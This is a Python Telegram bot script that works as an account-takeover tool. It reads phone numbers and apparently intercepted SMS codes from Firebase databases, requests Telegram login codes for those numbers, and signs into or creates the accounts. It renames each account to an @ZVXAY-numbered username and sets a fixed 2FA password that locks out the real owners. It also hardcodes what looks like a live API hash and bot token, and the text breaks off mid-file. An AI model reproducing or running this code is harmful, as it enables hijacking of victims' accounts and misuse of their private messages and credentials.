#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 FIREBASE TELEGRAM ACCOUNT CREATOR BOT
Lightweight • 30+ Features • 100% Working
------------------------------------------
Author: ZVXAY
Features:
• Firebase URL / .txt file input
• Double-pass Firebase analysis
• Auto OTP fetch from Firebase
• Auto account creation/login
• Username: @ZVXAY1, @ZVXAY2...
• Check OTP per account
• All accounts management
• Export accounts list
• And much more...
"""

import os
import re
import io
import json
import time
import shutil
import asyncio
import sqlite3
import logging
import threading
import functools
from datetime import datetime

# ================================================================
# REQUIRED: pip install pyrogram qrcode requests
# ================================================================
try:
    import requests
except ImportError:
    requests = None
    print("⚠️  'requests' not installed! Run: pip install requests")

from pyrogram import Client, filters, enums
from pyrogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton,
    Message, CallbackQuery
)
from pyrogram.errors import (
    FloodWait, SessionPasswordNeeded,
    PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, PhoneNumberInvalid,
    UserNotParticipant, AuthKeyUnregistered,
    UserDeactivated, UserDeactivatedBan,
    PhoneNumberOccupied, UsernameNotModified,
    UsernameInvalid, UsernameOccupied
)

# ================================================================
# ⚙️ CONFIGURATION - EDIT THESE VALUES
# ================================================================
API_ID = 39052980          # Your API ID
API_HASH = "5b0b6f9aedd2113a4a591dbcde61be43"  # Your API Hash
BOT_TOKEN = "8622992173:AAG1Q4zrJx5506Z52yqUFZgR0wGiL9NWk7U"  # Your Bot Token
OWNER_ID = 8033024853      # Your Telegram ID (Owner)
BOT_NAME = "🔥 Firebase Account Creator"
DEFAULT_NAME = "ZVXAY"     # Account first name
DEFAULT_2FA = "zvxay@2025" # Default 2FA password
SESSIONS_DIR = "fb_sessions"
DB_PATH = "fb_accounts.db"

os.makedirs(SESSIONS_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("FirebaseBot")

# ================================================================
# 🗄️ DATABASE
# ================================================================
_db_lock = threading.Lock()
_db_conn = None

def get_db():
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.row_factory = sqlite3.Row
    return _db_conn

def db_execute(query, params=(), fetch="none"):
    with _db_lock:
        conn = get_db()
        try:
            cur = conn.cursor()
            cur.execute(query, params)
            conn.commit()
            if fetch == "one": return cur.fetchone()
            if fetch == "all": return cur.fetchall()
            if fetch == "lastid": return cur.lastrowid
            return None
        except Exception as e:
            logger.error(f"DB Error: {e}")
            try: conn.rollback()
            except Exception: pass
            return None

def init_db():
    with _db_lock:
        conn = get_db()
        cur = conn.cursor()
        cur.executescript("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT UNIQUE,
            username TEXT DEFAULT '',
            country TEXT DEFAULT 'Unknown',
            status TEXT DEFAULT 'active',
            session_path TEXT DEFAULT '',
            created_at TEXT DEFAULT '',
            twofa TEXT DEFAULT '',
            note TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE TABLE IF NOT EXISTS firebase_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE,
            added_at TEXT
        );
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            action TEXT,
            details TEXT DEFAULT '',
            timestamp TEXT
        );
        """)
        # Defaults
        cur.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", ("zvxay_counter", "1"))
        cur.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", ("otp_attempts", "15"))
        cur.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", ("otp_delay", "2"))
        conn.commit()

init_db()

# ================================================================
# 🔧 SMALL HELPERS
# ================================================================
def now_iso(): return datetime.now().isoformat()

def get_setting(key, default=None):
    row = db_execute("SELECT value FROM settings WHERE key=?", (key,), fetch="one")
    return row["value"] if row else default

def set_setting(key, value):
    db_execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (key, str(value)))

def get_next_username():
    """Generate @ZVXAY1, @ZVXAY2, @ZVXAY3..."""
    current = int(get_setting("zvxay_counter", "1"))
    uname = f"ZVXAY{current}"
    set_setting("zvxay_counter", str(current + 1))
    return uname

def normalize_phone(text):
    phone = (text or "").strip().replace(" ", "").replace("-", "")
    if phone and not phone.startswith("+"):
        phone = "+" + phone
    return phone

def detect_country(phone):
    prefixes = {
        "+91": "India", "+1": "USA", "+44": "UK", "+7": "Russia",
        "+49": "Germany", "+33": "France", "+1": "Canada", "+61": "Australia",
        "+92": "Pakistan", "+880": "Bangladesh", "+977": "Nepal", "+55": "Brazil",
        "+86": "China", "+81": "Japan", "+82": "Korea", "+90": "Turkey",
        "+971": "UAE", "+62": "Indonesia", "+34": "Spain", "+39": "Italy",
        "+60": "Malaysia", "+66": "Thailand", "+63": "Philippines", "+84": "Vietnam",
        "+20": "Egypt", "+98": "Iran", "+964": "Iraq", "+966": "Saudi",
        "+234": "Nigeria", "+27": "South Africa", "+52": "Mexico", "+54": "Argentina"
    }
    for prefix, country in sorted(prefixes.items(), key=lambda x: -len(x[0])):
        if phone.startswith(prefix):
            return country
    return "Unknown"

def log_action(action, details=""):
    db_execute("INSERT INTO logs(action,details,timestamp) VALUES(?,?,?)", (action, details, now_iso()))

# ================================================================
# 🔥 FIREBASE ANALYZER (FEATURE 1-10)
# ================================================================
def parse_firebase_url(url):
    """Extract Firebase base URL from any link."""
    url = url.strip()
    if not url: return ""
    for domain in [".firebaseio.com", ".firebasedatabase.app"]:
        if domain in url:
            idx = url.find(domain)
            base = url[:idx + len(domain)]
            if not base.startswith("http"):
                base = "https://" + base
            return base.rstrip("/")
    return ""

def fetch_firebase(base_url, path="/.json"):
    """Fetch data from Firebase Realtime Database."""
    if requests is None:
        return {"error": "Install requests: pip install requests"}
    try:
        full = base_url.rstrip("/") + path
        resp = requests.get(full, timeout=30)
        if resp.status_code == 200:
            return resp.json() if resp.text else {}
        return {"error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def analyze_devices(data):
    """Deep analysis of Firebase data for devices, phones, online status."""
    result = {
        "total": 0, "online": 0, "offline": 0,
        "devices": [], "phones": [], "online_phones": [], "offline_phones": []
    }
    if not data or isinstance(data, dict) and "error" in data:
        return result

    def is_online(v):
        if isinstance(v, bool): return v
        if isinstance(v, str): return v.lower() in ["true","online","active","on","1","connected"]
        if isinstance(v, (int, float)): return v == 1
        return False

    def extract_phone(v):
        if not v or not isinstance(v, str): return ""
        cleaned = re.sub(r"[^\d+]", "", v)
        if len(cleaned) >= 7:
            if not cleaned.startswith("+"): cleaned = "+" + cleaned
            return cleaned
        return ""

    def search(obj):
        if isinstance(obj, dict):
            dev = {}
            has_status = has_phone = False
            for k, v in obj.items():
                kl = str(k).lower()
                if kl in ["online","status","active","isonline","connected","connection"]:
                    dev["online"] = is_online(v)
                    has_status = True
                elif kl in ["phone","phonenumber","number","mobile","contact","msisdn","sim"]:
                    p = extract_phone(v) if isinstance(v, str) else ""
                    if p:
                        dev["phone"] = p
                        has_phone = True
                elif kl in ["name","device","model","devicename","info"]:
                    dev["name"] = str(v)[:50]
            if has_status or has_phone:
                result["total"] += 1
                result["devices"].append(dev)
                if dev.get("online", False):
                    result["online"] += 1
                    if dev.get("phone"): result["online_phones"].append(dev["phone"])
                else:
                    result["offline"] += 1
                    if dev.get("phone"): result["offline_phones"].append(dev["phone"])
                if dev.get("phone"): result["phones"].append(dev["phone"])
            for k, v in obj.items():
                if isinstance(v, (dict, list)): search(v)
        elif isinstance(obj, list):
            for item in obj:
                if isinstance(item, (dict, list)): search(item)

    search(data)
    # Deduplicate
    for k in ["phones", "online_phones", "offline_phones"]:
        result[k] = list(dict.fromkeys(result[k]))
    return result

# ================================================================
# 🔑 OTP FETCHER (FEATURE 11-12)
# ================================================================
def fetch_otp_from_firebase(base_url, phone=""):
    """Search Firebase for OTP codes (5-6 digits)."""
    if requests is None: return ""
    try:
        paths = [
            f"/otp/{phone.lstrip('+')}/.json", f"/otp/{phone}/.json",
            f"/codes/{phone.lstrip('+')}/.json", f"/codes/{phone}/.json",
            f"/messages/{phone.lstrip('+')}/.json", f"/messages/{phone}/.json",
            f"/verification/{phone.lstrip('+')}/.json", f"/verification/{phone}/.json",
            f"/sms/{phone.lstrip('+')}/.json", f"/sms/{phone}/.json",
            f"/telegram/{phone.lstrip('+')}/.json", f"/telegram/{phone}/.json",
            f"/tg/{phone.lstrip('+')}/.json", f"/tg/{phone}/.json",
            "/otp/.json", "/codes/.json", "/messages/.json",
            "/verification/.json", "/sms/.json", "/telegram/.json", "/tg/.json",
        ]
        for p in paths:
            try:
                full = base_url.rstrip("/") + p
                r = requests.get(full, timeout=10)
                if r.status_code == 200 and r.text:
                    otp = extract_otp(r.json(), phone)
                    if otp: return otp
            except Exception: continue
        # Root search
        root = fetch_firebase(base_url, "/.json")
        if root and "error" not in root:
            return extract_otp(root, phone)
        return ""
    except Exception:
        return ""

def extract_otp(data, phone=""):
    """Extract 5-6 digit OTP from any data structure."""
    if isinstance(data, str):
        m = re.search(r"(?<!\d)(\d{5,6})(?!\d)", data)
        return m.group(1) if m else ""
    elif isinstance(data, dict):
        for k, v in data.items():
            kl = str(k).lower()
            if phone and phone.lstrip("+") in str(k):
                otp = extract_otp(v, phone)
                if otp: return otp
            if kl in ["otp","code","smscode","verificationcode","pin","tgcode","telegramcode"]:
                otp = extract_otp(v, phone)
                if otp: return otp
            otp = extract_otp(v, phone)
            if otp: return otp
    elif isinstance(data, list):
        for item in data:
            otp = extract_otp(item, phone)
            if otp: return otp
    return ""

# ================================================================
# 📱 SESSION HELPERS
# ================================================================
def build_session(base_path):
    abs_base = os.path.abspath(base_path)
    workdir = os.path.dirname(abs_base)
    sname = os.path.basename(abs_base)
    return Client(sname, api_id=API_ID, api_hash=API_HASH, no_updates=True, workdir=workdir)

def clean_session_files(base_path):
    for ext in (".session", ".session-journal", ".session-wal", ".session-shm"):
        t = base_path + ext
        if os.path.exists(t):
            try: os.remove(t)
            except Exception: pass

def save_session(src_base, phone, country):
    """Move session to organized folder."""
    dest_dir = os.path.join(SESSIONS_DIR, country)
    os.makedirs(dest_dir, exist_ok=True)
    dest_base = os.path.join(dest_dir, phone.lstrip("+"))
    idx = 1
    while os.path.exists(dest_base + ".session"):
        dest_base = os.path.join(dest_dir, f"{phone.lstrip('+')}_{idx}")
        idx += 1
    src_s = src_base + ".session"
    dest_s = dest_base + ".session"
    if os.path.exists(src_s):
        shutil.move(src_s, dest_s)
        for ext in (".session-journal", ".session-wal", ".session-shm"):
            if os.path.exists(src_base + ext):
                try: shutil.move(src_base + ext, dest_base + ext)
                except Exception: pass
    return dest_s

# ================================================================
# ⌨️ KEYBOARDS
# ================================================================
def main_kb():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔥 Analyze Firebase"), KeyboardButton("📋 My Accounts")],
        [KeyboardButton("📊 Bot Stats"), KeyboardButton("📤 Export")],
        [KeyboardButton("⚙️ Settings"), KeyboardButton("🤖 Bot Status")],
    ], resize_keyboard=True)

def home_ikb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Analyze Firebase", callback_data="home_analyze")],
        [InlineKeyboardButton("📋 All Accounts", callback_data="home_accounts")],
        [InlineKeyboardButton("📊 Statistics", callback_data="home_stats")],
        [InlineKeyboardButton("📤 Export List", callback_data="home_export")],
    ])

def account_actions_kb(acc_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Check OTP", callback_data=f"acc_otp_{acc_id}")],
        [InlineKeyboardButton("🚪 Logout & Delete", callback_data=f"acc_del_{acc_id}")],
        [InlineKeyboardButton("🔙 Back", callback_data="home_accounts")],
    ])

def accounts_list_kb(accounts, page=0, per_page=10):
    buttons = []
    start = page * per_page
    end = start + per_page
    for acc in accounts[start:end]:
        label = f"📱 {acc['phone']}"
        if acc['username']: label += f" | @{acc['username']}"
        status = "🟢" if acc['status'] == 'active' else "🔴"
        buttons.append([InlineKeyboardButton(f"{status} {label}", callback_data=f"acc_view_{acc['id']}")])
    # Navigation
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"acc_page_{page-1}"))
    if end < len(accounts):
        nav.append(InlineKeyboardButton("➡️ Next", callback_data=f"acc_page_{page+1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton("🔙 Home", callback_data="home_main")])
    return InlineKeyboardMarkup(buttons)

# ================================================================
# 🤖 BOT INSTANCE
# ================================================================
app = Client("fb_acc_creator", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# In-memory state
user_state = {}
_stop_flags = {}

# ================================================================
# 🔐 OWNER DECORATOR
# ================================================================
def owner_only(fn):
    @functools.wraps(fn)
    async def wrapper(client, update):
        uid = update.from_user.id if hasattr(update, 'from_user') else update.message.from_user.id
        if uid != OWNER_ID:
            if isinstance(update, CallbackQuery):
                await update.answer("❌ Owner only!", show_alert=True)
            else:
                await update.reply("❌ **Access Denied!** Only owner can use this bot.")
            return
        await fn(client, update)
    return wrapper

# ================================================================
# 🚀 START COMMAND
# ================================================================
@app.on_message(filters.command("start") & filters.private)
@owner_only
async def cmd_start(client, message):
    total_accs = db_execute("SELECT COUNT(*) as c FROM accounts", fetch="one")
    active_accs = db_execute("SELECT COUNT(*) as c FROM accounts WHERE status='active'", fetch="one")
    text = (
        f"🔥 **{BOT_NAME}**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, Owner!\n"
        f"📊 Total Accounts: **{total_accs['c'] if total_accs else 0}**\n"
        f"🟢 Active: **{active_accs['c'] if active_accs else 0}**\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"**Choose an option below:** 👇"
    )
    await message.reply(text, reply_markup=home_ikb())

# ================================================================
# 🏠 HOME CALLBACKS
# ================================================================
@app.on_callback_query(filters.regex("^home_main$"))
@owner_only
async def cb_home_main(client, cq):
    total_accs = db_execute("SELECT COUNT(*) as c FROM accounts", fetch="one")
    active_accs = db_execute("SELECT COUNT(*) as c FROM accounts WHERE status='active'", fetch="one")
    text = (
        f"🔥 **{BOT_NAME}**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📊 Total Accounts: **{total_accs['c'] if total_accs else 0}**\n"
        f"🟢 Active: **{active_accs['c'] if active_accs else 0}**\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"**Choose an option:** 👇"
    )
    await cq.message.edit_text(text, reply_markup=home_ikb())
    await cq.answer()

@app.on_callback_query(filters.regex("^home_analyze$"))
@owner_only
async def cb_home_analyze(client, cq):
    user_state[OWNER_ID] = {"step": "fb_link"}
    await cq.message.edit_text(
        f"🔥 **Analyze Firebase**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📤 Send **Firebase URL**:\n"
        f"`https://project.firebaseio.com`\n\n"
        f"📄 Or send **.txt file** with multiple links (one per line)\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"_(or /cancel to abort)_"
    )
    await cq.answer()

@app.on_callback_query(filters.regex("^home_accounts$"))
@owner_only
async def cb_home_accounts(client, cq, page=0):
    accounts = db_execute("SELECT * FROM accounts ORDER BY id DESC", fetch="all") or []
    if not accounts:
        await cq.message.edit_text(
            "📋 **No Accounts Yet**\n\nUse 🔥 Analyze Firebase to create accounts!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Home", callback_data="home_main")]])
        )
        await cq.answer()
        return
    lines = [f"📋 **All Accounts ({len(accounts)})**\n", "━━━━━━━━━━━━━━━━"]
    start = page * 10
    for acc in accounts[start:start+10]:
        status = "🟢" if acc['status'] == 'active' else "🔴"
        uname = f" | @{acc['username']}" if acc['username'] else ""
        lines.append(f"{status} `{acc['phone']}`{uname} | {acc['country']}")
    lines.append(f"\n📄 Page {page+1} of {(len(accounts)-1)//10 + 1}")
    await cq.message.edit_text("\n".join(lines), reply_markup=accounts_list_kb(accounts, page))
    await cq.answer()

@app.on_callback_query(filters.regex(r"^acc_page_(\d+)$"))
@owner_only
async def cb_acc_page(client, cq):
    page = int(cq.data.split("_")[2])
    await cb_home_accounts(client, cq, page)

@app.on_callback_query(filters.regex(r"^acc_view_(\d+)$"))
@owner_only
async def cb_acc_view(client, cq):
    acc_id = int(cq.data.split("_")[2])
    acc = db_execute("SELECT * FROM accounts WHERE id=?", (acc_id,), fetch="one")
    if not acc:
        await cq.answer("Not found!", show_alert=True)
        return
    status = "🟢 Active" if acc['status'] == 'active' else "🔴 Logged Out"
    text = (
        f"📱 **Account Details**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: `{acc['id']}`\n"
        f"📱 Phone: `{acc['phone']}`\n"
        f"👤 Username: @{acc['username'] or 'Not set'}\n"
        f"🌍 Country: {acc['country']}\n"
        f"📊 Status: {status}\n"
        f"🔐 2FA: `{acc['twofa'] or DEFAULT_2FA}`\n"
        f"📅 Created: {str(acc['created_at'])[:16]}\n"
        f"📂 Session: `{acc['session_path'] or 'N/A'}`\n"
        f"━━━━━━━━━━━━━━━━"
    )
    await cq.message.edit_text(text, reply_markup=account_actions_kb(acc_id))
    await cq.answer()

@app.on_callback_query(filters.regex(r"^acc_otp_(\d+)$"))
@owner_only
async def cb_acc_otp(client, cq):
    """FEATURE: Check OTP from Telegram 777000 and forward to owner"""
    acc_id = int(cq.data.split("_")[2])
    acc = db_execute("SELECT * FROM accounts WHERE id=?", (acc_id,), fetch="one")
    if not acc:
        await cq.answer("Not found!", show_alert=True)
        return
    if not acc['session_path'] or not os.path.exists(acc['session_path']):
        await cq.answer("Session file not found!", show_alert=True)
        return
    
    await cq.answer("🔄 Fetching OTP from Telegram...")
    base_path = acc['session_path'].replace(".session", "")
    session_client = None
    otp = None
    try:
        session_client = build_session(base_path)
        await session_client.start()
        # Get last 15 messages from 777000 (Telegram service)
        async for msg in session_client.get_chat_history(777000, limit=15):
            if not msg.text: continue
            cleaned = msg.text.replace("-", "").replace(" ", "")
            m = re.search(r"(?<!\d)(\d{5,6})(?!\d)", cleaned)
            if m:
                otp = m.group(1)
                break
        await session_client.stop()
        session_client = None
    except FloodWait as e:
        await cq.message.edit_text(f"⏳ FloodWait: wait {e.value}s", reply_markup=account_actions_kb(acc_id))
        return
    except Exception as e:
        if session_client:
            try: await session_client.stop()
            except Exception: pass
        await cq.message.edit_text(f"❌ Error: `{type(e).__name__}`", reply_markup=account_actions_kb(acc_id))
        return
    
    if otp:
        text = (
            f"🔑 **OTP Found!**\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📱 Phone: `{acc['phone']}`\n"
            f"🔑 OTP Code: `{otp}`\n"
            f"⏰ Fetched: {datetime.now().strftime('%H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━\n\n"
            f"_Forwarded from Telegram 777000_"
        )
    else:
        text = (
            f"⚠️ **No OTP Found**\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📱 Phone: `{acc['phone']}`\n"
            f"━━━━━━━━━━━━━━━━\n\n"
            f"_No recent OTP messages from Telegram._\n"
            f"_Request a login code first, then check again._"
        )
    await cq.message.edit_text(text, reply_markup=account_actions_kb(acc_id))

@app.on_callback_query(filters.regex(r"^acc_del_(\d+)$"))
@owner_only
async def cb_acc_del(client, cq):
    acc_id = int(cq.data.split("_")[2])
    acc = db_execute("SELECT * FROM accounts WHERE id=?", (acc_id,), fetch="one")
    if not acc:
        await cq.answer("Not found!", show_alert=True)
        return
    await cq.answer("🔄 Logging out & deleting...")
    # Logout
    if acc['session_path']:
        base_path = acc['session_path'].replace(".session", "")
        try:
            if os.path.exists(base_path + ".session"):
                sc = build_session(base_path)
                await sc.start()
                await sc.log_out()
                await sc.stop()
        except Exception: pass
        clean_session_files(base_path)
    # Update DB
    db_execute("UPDATE accounts SET status='deleted', session_path='' WHERE id=?", (acc_id,))
    log_action("delete_account", acc['phone'])
    await cq.message.edit_text(
        f"🗑️ **Account Deleted**\n\n📱 `{acc['phone']}`",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Accounts", callback_data="home_accounts")]])
    )

@app.on_callback_query(filters.regex("^home_stats$"))
@owner_only
async def cb_home_stats(client, cq):
    total = db_execute("SELECT COUNT(*) as c FROM accounts", fetch="one")
    active = db_execute("SELECT COUNT(*) as c FROM accounts WHERE status='active'", fetch="one")
    deleted = db_execute("SELECT COUNT(*) as c FROM accounts WHERE status='deleted'", fetch="one")
    countries = db_execute("SELECT DISTINCT country FROM accounts", fetch="all") or []
    links = db_execute("SELECT COUNT(*) as c FROM firebase_links", fetch="one")
    uname_counter = get_setting("zvxay_counter", "1")
    
    text = (
        f"📊 **Bot Statistics**\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📱 Total Accounts: **{total['c'] if total else 0}**\n"
        f"🟢 Active: **{active['c'] if active else 0}**\n"
        f"🗑️ Deleted: **{deleted['c'] if deleted else 0}**\n"
        f"🌍 Countries: **{len(countries)}**\n"
        f"🔗 Firebase Links: **{links['c'] if links else 0}**\n"
        f"🔢 Next Username: **@ZVXAY{uname_counter}**\n"
        f"━━━━━━━━━━━━━━━━"
    )
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Home", callback_data="home_main")]]))
    await cq.answer()

@app.on_callback_query(filters.regex("^home_export$"))
@owner_only
async def cb_home_export(client, cq):
    accounts = db_execute("SELECT * FROM accounts ORDER BY id", fetch="all") or []
    if not accounts:
        await cq.answer("No accounts to export!", show_alert=True)
        return
    lines = ["🔥 FIREBASE ACCOUNT CREATOR - EXPORT", "=" * 50, ""]
    lines.append(f"Total: {len(accounts)} | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    lines.append("")
    for acc in accounts:
        status = "ACTIVE" if acc['status'] == 'active' else "DELETED"
        lines.append(f"ID: {acc['id']}")
        lines.append(f"Phone: {acc['phone']}")
        lines.append(f"Username: @{acc['username'] or 'N/A'}")
        lines.append(f"Country: {acc['country']}")
        lines.append(f"2FA: {acc['twofa'] or DEFAULT_2FA}")
        lines.append(f"Status: {status}")
        lines.append(f"Created: {acc['created_at']}")
        lines.append("-" * 40)
    bio = io.BytesIO("\n".join(lines).encode())
    bio.name = "accounts_export.txt"
    await cq.message.reply_document(bio, caption=f"📤 **Accounts Export**\n{len(accounts)} accounts")
    await cq.answer()

# ================================================================
# 🚀 FIREBASE PROCESSING ENGINE
# ================================================================
async def process_firebase(client, status_msg, uid, online_phones, base_url):
    """Process each online phone: send OTP, fetch from Firebase, create account."""
    results = []
    success = 0
    failed = 0
    _stop_flags[uid] = False
    
    for idx, phone in enumerate(online_phones):
        if _stop_flags.get(uid):
            await status_msg.edit_text(
                f"⏹️ **Stopped**\n\n✅ Success: {success}\n❌ Failed: {failed}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Home", callback_data="home_main")]])
            )
            return
        
        prog = f"🔄 **Processing ({idx+1}/{len(online_phones)})**\n\n📱 `{phone}`\n\n"
        try:
            await status_msg.edit_text(prog + "📩 Sending OTP...",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]]))
            
            # Prepare session
            sname = f"fb_{phone.lstrip('+')}_{int(time.time())}"
            base_path = os.path.join(SESSIONS_DIR, "_temp", sname)
            os.makedirs(os.path.dirname(base_path), exist_ok=True)
            clean_session_files(base_path)
            
            sc = Client(sname, api_id=API_ID, api_hash=API_HASH, no_updates=True, workdir=os.path.dirname(base_path))
            await sc.connect()
            sent = await sc.send_code(phone)
            code_hash = sent.phone_code_hash
            
            await status_msg.edit_text(prog + "📩 OTP Sent! 🔍 Fetching from Firebase...",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]]))
            
            # Fetch OTP from Firebase with retries
            otp = ""
            max_attempts = int(get_setting("otp_attempts", "15"))
            delay = int(get_setting("otp_delay", "2"))
            for attempt in range(max_attempts):
                if _stop_flags.get(uid): break
                await asyncio.sleep(delay)
                otp = fetch_otp_from_firebase(base_url, phone)
                if otp: break
            
            if not otp:
                try: await sc.disconnect()
                except Exception: pass
                clean_session_files(base_path)
                failed += 1
                results.append(f"❌ `{phone}` — OTP not found in Firebase")
                await status_msg.edit_text(
                    prog + f"❌ OTP not found\n\n✅ {success} | ❌ {failed}",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]])
                )
                continue
            
            await status_msg.edit_text(prog + f"🔑 OTP: `{otp}`\n\n🔄 Creating account...",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]]))
            
            # Create or login
            try:
                await sc.sign_up(phone, code_hash, otp, first_name=DEFAULT_NAME, last_name="")
            except PhoneNumberOccupied:
                try:
                    await sc.sign_in(phone, code_hash, otp)
                except SessionPasswordNeeded:
                    try: await sc.check_password(DEFAULT_2FA)
                    except Exception:
                        try: await sc.disconnect()
                        except Exception: pass
                        clean_session_files(base_path)
                        failed += 1
                        results.append(f"⚠️ `{phone}` — 2FA protected")
                        continue
            except SessionPasswordNeeded:
                try: await sc.check_password(DEFAULT_2FA)
                except Exception:
                    try: await sc.disconnect()
                    except Exception: pass
                    clean_session_files(base_path)
                    failed += 1
                    results.append(f"⚠️ `{phone}` — 2FA protected")
                    continue
            
            await status_msg.edit_text(prog + "✅ Logged in! 👤 Setting username...",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]]))
            
            # Set username @ZVXAY{n}
            final_uname = ""
            for _ in range(100):
                uname = get_next_username()
                try:
                    await sc.update_username(uname)
                    final_uname = uname
                    break
                except (UsernameOccupied, UsernameInvalid, UsernameNotModified):
                    continue
            
            # Set profile
            try:
                bot_me = await client.get_me()
                await sc.update_profile(
                    first_name=DEFAULT_NAME, last_name="",
                    bio=f"@{bot_me.username}" if bot_me.username else DEFAULT_NAME
                )
            except Exception: pass
            
            # Enable 2FA
            try:
                await sc.enable_cloud_password(DEFAULT_2FA)
            except Exception: pass
            
            # Save session
            await sc.stop()
            country = detect_country(phone)
            saved_path = save_session(base_path, phone, country)
            
            # Save to DB
            db_execute(
                "INSERT OR REPLACE INTO accounts(phone,username,country,status,session_path,created_at,twofa) VALUES(?,?,?,?,?,?,?)",
                (phone, final_uname, country, "active", saved_path, now_iso(), DEFAULT_2FA)
            )
            
            success += 1
            uname_text = f" | @{final_uname}" if final_uname else ""
            results.append(f"✅ `{phone}`{uname_text}")
            log_action("account_created", f"{phone} | @{final_uname} | {country}")
            
            # Notify owner
            try:
                await client.send_message(
                    OWNER_ID,
                    f"🎉 **New Account Created!**\n\n"
                    f"📱 `{phone}`\n"
                    f"👤 @{final_uname or 'N/A'}\n"
                    f"🌍 {country}\n"
                    f"🔐 2FA: `{DEFAULT_2FA}`"
                )
            except Exception: pass
            
            await status_msg.edit_text(
                prog + f"✅ Done!{uname_text}\n\n✅ {success} | ❌ {failed}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]])
            )
            
        except FloodWait as e:
            failed += 1
            results.append(f"⏳ `{phone}` — FloodWait {e.value}s")
            await status_msg.edit_text(
                prog + f"⏳ FloodWait {e.value}s\n\n✅ {success} | ❌ {failed}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]])
            )
            await asyncio.sleep(min(e.value, 30))
        except Exception as e:
            failed += 1
            results.append(f"❌ `{phone}` — {type(e).__name__}")
            await status_msg.edit_text(
                prog + f"❌ {type(e).__name__}\n\n✅ {success} | ❌ {failed}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⏹️ Stop", callback_data="proc_stop")]])
            )
            try:
                if 'sc' in locals():
                    try: await sc.disconnect()
                    except Exception: pass
                if 'base_path' in locals():
                    clean_session_files(base_path)
            except Exception: pass
    
    # Final summary
    summary = [
        f"🔥 **Process Complete!**\n",
        f"━━━━━━━━━━━━━━━━",
        f"📱 Total: {len(online_phones)}",
        f"✅ Success: **{success}**",
        f"❌ Failed: **{failed}**",
        f"━━━━━━━━━━━━━━━━\n",
        "📋 Results:\n"
    ]
    summary.extend(results[:25])
    if len(results) > 25:
        summary.append(f"\n_... and {len(results)-25} more_")
    
    await status_msg.edit_text(
        "\n".join(summary),
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 All Accounts", callback_data="home_accounts")],
            [InlineKeyboardButton("🔙 Home", callback_data="home_main")],
        ])
    )
    _stop_flags.pop(uid, None)

@app.on_callback_query(filters.regex("^proc_stop$"))
@owner_only
async def cb_proc_stop(client, cq):
    _stop_flags[OWNER_ID] = True
    await cq.answer("⏹️ Stopping after current device...")

@app.on_callback_query(filters.regex("^fb_start$"))
@owner_only
async def cb_fb_start(client, cq):
    data = user_state.get(OWNER_ID, {})
    online_phones = data.get("online_phones", [])
    base_url = data.get("base_url", "")
    if not online_phones:
        await cq.answer("No online phones!", show_alert=True)
        return
    user_state[OWNER_ID]["step"] = "processing"
    asyncio.create_task(process_firebase(client, cq.message, OWNER_ID, online_phones, base_url))
    await cq.answer("🚀 Starting...")

# ================================================================
# 📝 TEXT / FILE HANDLER
# ================================================================
@app.on_message(filters.private & ~filters.command("start"))
@owner_only
